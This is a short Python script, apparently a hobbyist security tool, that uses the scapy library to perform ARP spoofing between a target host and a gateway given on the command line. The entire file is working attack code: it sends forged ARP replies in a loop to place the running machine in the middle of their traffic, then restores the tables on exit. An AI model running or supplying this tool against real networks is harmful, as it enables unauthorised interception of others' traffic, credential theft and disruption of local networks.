import scapy.all as scapy
import time
import optparse


def GetMacAddress(ip):
    arpRequestPacket = scapy.ARP(pdst=ip)
    broadcastPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combinedPacket = broadcastPacket/arpRequestPacket
    answeredList = scapy.srp(combinedPacket, timeout=1, verbose=False)[0]

    return answeredList[0][1].hwsrc


def ArpPoisoning(targetIp, poisonedIp):

    targetMac = GetMacAddress(targetIp)
    arpResponse = scapy.ARP(op=2, pdst=targetIp,hwdst=targetMac, psrc=poisonedIp)
    scapy.send(arpResponse, verbose=False)


def ResetOperation(fooledIp, gatewayIp):

    fooledMac = GetMacAddress(fooledIp)
    gatewayMac = GetMacAddress(gatewayIp)

    arpResponse = scapy.ARP(
        op=2, pdst=fooledIp, hwdst=fooledMac, psrc=gatewayIp, hwsrc=gatewayMac)
    scapy.send(arpResponse, verbose=False, count=6)


def GetUserInput():
    parseOpject = optparse.OptionParser()

    parseOpject.add_option(
        "-t", "--target", dest="targetIp", help="Enter Target IP")
    parseOpject.add_option(
        "-g", "--gateway", dest="gatewayIp", help="Enter Gateway IP")

    options, _ = parseOpject.parse_args()

    if not options.targetIp or not options.gatewayIp:
        parseOpject.error(
            "Please provide both target and gateway IP addresses.")

    return options



number = 0

userIps = GetUserInput()
userTargetIps = userIps.targetIp
userGatewayIp = userIps.gatewayIp

try:
    while True:

        ArpPoisoning(userTargetIps, userGatewayIp)
        ArpPoisoning(userGatewayIp, userTargetIps)

        number += 2

        print("\rSending packets " + str(number), end="")

        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    ResetOperation(userTargetIps, userGatewayIp)
    ResetOperation(userGatewayIp, userTargetIps)
